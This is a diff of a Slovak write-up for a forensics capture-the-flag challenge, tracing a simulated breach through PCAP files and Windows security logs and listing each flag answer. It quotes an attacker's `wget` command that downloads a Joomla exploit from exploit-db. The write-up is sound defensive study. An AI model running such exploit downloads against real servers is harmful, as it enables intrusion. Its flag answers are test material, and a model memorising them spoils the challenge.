@@ -6,6 +6,8 @@ Reported Difficulty: 1
 ## 1 Kontrola
 > Z dodaného PCAP súboru je potrebné zistiť či naozaj je spoločnosť infikovaná, a pokiaľ áno, tak je potrebné zistiť o aký privátny klúč sa odosiela. Vlajka je IP adresa serveru na ktorý sa klúč odoslal.
 
+> Body: 3
+
 Otvorime `part1.pcap` vo Wireshark a pustime sa do analyzi. Musim uznat ze som to isiel skratkou a skusal rozne IPecky z komunikacie kym som nenatrafil na tu pravu: `194.182.66.53`
 
 ```
@@ -16,6 +18,8 @@ flag: 194.182.66.53
 > Zdrojová IP počítača ktorý odosielal privátny klúč, patrí lokálnemu počítaču s windows. Je potrebné zistiť ako prenikli do tohto systému. Prikladáme bezpečnostný log v XML formáte.
 https://drive.google.com/file/d/1pmJNCfgnpTCMewCaRioqagYj0_VLcold/view?usp=sharing
 Vlajka je dátum a čas prvého prieniku (Formát Y-m-d H:i:s)
+
+> Body: 3
 
 V tomto kroku mame securty log v xml, otvorime ho v LibreOffice Calc a pozrieme sa na rozne eventy co tam mame. Zo poctu roznych logov vidime vysoky vyskit 4625 co je Failed Login.
 
@@ -32,6 +36,8 @@ flag: 2022-02-22 20:40:08
 ## 3 Ktorý proces?
 > Po bruteforce útoku a prihlásení, útočník spustil malvér. Je potrebné zistiť meno procesu. Vlajka je meno procesu (Formát: meno_procesu.format)
 
+> Body: 3
+
 V LibreOffice vyfiltrujeme vsetky eventy s ProcessName a NewProcessName a hladame nieco podozrive po case prveho successfull loginu utocnika a o chvilku to mame:
 
 ![](images/2022-03-06-13-10-07.png)
@@ -43,6 +49,8 @@ flag: YouWillCryRansomware3000.exe
 ## 4 Otvorený test
 > Kompromitovaný LinuxServerWebServer je náše testovacie prostredie, aplikácie na serveri sú dostupné iba z lokálnej siete, ale telnet server je otvorený do sveta. Prikladáme Pcap s potrebnými dátami. https://drive.google.com/file/d/1y3pOvG9PDGf7Sg7HtgOGvfjpk6qlVYor/view?usp=sharing
 Vlajka je EpochTime prieniku do systému (bez milisekúnd).
+
+> Body: 3
 
 Po otvoreni `web.pcap` suboru, poobzerame sa trosku okolo a uvidime ze sa niekdo snazi prihlasit cez telnet session:
 
@@ -63,6 +71,8 @@ flag: 1645560004
 ## 5 Stará joomla
 > Z logov sme zistili že útočník vyhackoval aj našu joomlu na testovacom serveri. Z posledného PCAP súboru je potrebné zistiť aký exploit útočník použil.
 Vlajka je url odkial útočník exploit stiahol (Formát: www.stránka_exploitu.doména/cesta_k_exploitu)
+
+> Body: 3
 
 Pri pozerani zopar dalsich paketov, vidime ze utocnik prve co spravil je `wget https://www.exploit-db.com/download/47465`, rychly nahlad do toho url nam potvrdzuje ze ide o Joomla expoit.
 
